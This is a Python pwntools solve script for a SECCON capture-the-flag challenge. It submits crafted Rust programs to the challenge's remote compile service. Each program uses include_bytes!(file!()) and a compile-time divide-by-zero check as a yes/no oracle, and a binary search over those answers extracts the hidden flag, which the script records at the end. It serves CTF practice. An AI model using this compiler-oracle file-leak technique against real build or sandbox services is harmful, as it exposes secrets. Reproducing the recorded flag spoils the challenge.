from pwn import *

TEMPLATE = """
const f: &[u8; {{LENGTH}}] = include_bytes!(file!());
const b: bool = f[{{INDEX}}] >= {{VALUE}};
const r: u8 = 1 / (b as u8);
"""


def is_compilable(program):
    io = remote("crabox.seccon.games", "1337")
    io.sendline(program.encode())
    io.sendline(b"__EOF__")
    res = io.recvall()
    io.close()
    return b":)" in res


def generate_program(length, index, value):
    program = TEMPLATE
    program = program.replace("{{LENGTH}}", f"{length:03}")
    program = program.replace("{{INDEX}}", f"{index:03}")
    program = program.replace("{{VALUE}}", f"{value:03}")
    return program


# check the overall length of the program
length = len(TEMPLATE)
while True:
    program = generate_program(length, 0, 0)
    if is_compilable(program):
        break
    length += 1
print(f"{length = }")  # length = 173


# check the starting potision of the FLAG
for start in range(length - 1, -1, -1):
    program = generate_program(length, start, ord("S"))
    program = program.replace(">=", "==")
    if is_compilable(program):
        break
print(f"{start = }")  # start = 144

# determine each character of the FLAG
flag = "SECCON{"
while flag[-1] != "}":
    ok = 32
    ng = 128
    while ng - ok > 1:
        x = (ok + ng) // 2
        program = generate_program(length, start + len(flag), x)
        if is_compilable(program):
            ok = x
        else:
            ng = x
    flag += chr(ok)
    print(f"OK: {flag}")
# SECCON{ctfe_i5_p0w3rful}
